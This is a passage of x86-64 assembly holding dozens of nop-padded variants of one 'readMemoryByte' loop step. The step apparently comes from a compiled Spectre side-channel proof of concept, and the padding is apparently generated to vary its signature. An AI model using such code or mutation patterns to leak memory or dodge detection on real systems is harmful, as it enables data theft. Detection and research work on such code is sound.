.LreadMemoryByte_win0_var9:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
	nop
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 10
.LreadMemoryByte_win0_var10:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 11
.LreadMemoryByte_win0_var11:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 12
.LreadMemoryByte_win0_var12:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 13
.LreadMemoryByte_win0_var13:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 14
.LreadMemoryByte_win0_var14:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 15
.LreadMemoryByte_win0_var15:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 16
.LreadMemoryByte_win0_var16:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	nop
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 17
.LreadMemoryByte_win0_var17:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 18
.LreadMemoryByte_win0_var18:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	nop
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 19
.LreadMemoryByte_win0_var19:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 20
.LreadMemoryByte_win0_var20:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 21
.LreadMemoryByte_win0_var21:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 22
.LreadMemoryByte_win0_var22:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 23
.LreadMemoryByte_win0_var23:
	popq	%rax
	nop
	nop
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 24
.LreadMemoryByte_win0_var24:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 25
.LreadMemoryByte_win0_var25:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 26
.LreadMemoryByte_win0_var26:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 27
.LreadMemoryByte_win0_var27:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 28
.LreadMemoryByte_win0_var28:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 29
.LreadMemoryByte_win0_var29:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 30
.LreadMemoryByte_win0_var30:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 31
.LreadMemoryByte_win0_var31:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 32
.LreadMemoryByte_win0_var32:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	nop
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 33
.LreadMemoryByte_win0_var33:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 34
.LreadMemoryByte_win0_var34:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 35
.LreadMemoryByte_win0_var35:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 36
.LreadMemoryByte_win0_var36:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 37
.LreadMemoryByte_win0_var37:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 38
.LreadMemoryByte_win0_var38:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 39
.LreadMemoryByte_win0_var39:
	popq	%rax
	nop
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 40
.LreadMemoryByte_win0_var40:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 41
.LreadMemoryByte_win0_var41:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 42
.LreadMemoryByte_win0_var42:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 43
.LreadMemoryByte_win0_var43:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 44
.LreadMemoryByte_win0_var44:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 45
.LreadMemoryByte_win0_var45:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 46
.LreadMemoryByte_win0_var46:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 47
.LreadMemoryByte_win0_var47:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 48
.LreadMemoryByte_win0_var48:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 49
.LreadMemoryByte_win0_var49:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 50
.LreadMemoryByte_win0_var50:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 51
.LreadMemoryByte_win0_var51:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 52
.LreadMemoryByte_win0_var52:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 53
.LreadMemoryByte_win0_var53:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 54
.LreadMemoryByte_win0_var54:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 55
.LreadMemoryByte_win0_var55:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
	nop
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 56
.LreadMemoryByte_win0_var56:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 57
.LreadMemoryByte_win0_var57:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 58
.LreadMemoryByte_win0_var58:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 59
.LreadMemoryByte_win0_var59:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 60
.LreadMemoryByte_win0_var60:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 61
.LreadMemoryByte_win0_var61:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	nop
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 62
.LreadMemoryByte_win0_var62:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 63
.LreadMemoryByte_win0_var63:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 64
.LreadMemoryByte_win0_var64:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 65
.LreadMemoryByte_win0_var65:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 66
.LreadMemoryByte_win0_var66:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 67
.LreadMemoryByte_win0_var67:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 68
.LreadMemoryByte_win0_var68:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 69
.LreadMemoryByte_win0_var69:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 70
.LreadMemoryByte_win0_var70:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 71
.LreadMemoryByte_win0_var71:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 72
.LreadMemoryByte_win0_var72:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 73
.LreadMemoryByte_win0_var73:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 74
.LreadMemoryByte_win0_var74:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 75
.LreadMemoryByte_win0_var75:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 76
.LreadMemoryByte_win0_var76:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 77
.LreadMemoryByte_win0_var77:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 78
.LreadMemoryByte_win0_var78:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 79
.LreadMemoryByte_win0_var79:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 80
.LreadMemoryByte_win0_var80:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 81
.LreadMemoryByte_win0_var81:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 82
.LreadMemoryByte_win0_var82:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 83
.LreadMemoryByte_win0_var83:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 84
.LreadMemoryByte_win0_var84:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 85
.LreadMemoryByte_win0_var85:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 86
.LreadMemoryByte_win0_var86:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 87
.LreadMemoryByte_win0_var87:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 88
.LreadMemoryByte_win0_var88:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 89
.LreadMemoryByte_win0_var89:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	nop
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 90
.LreadMemoryByte_win0_var90:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
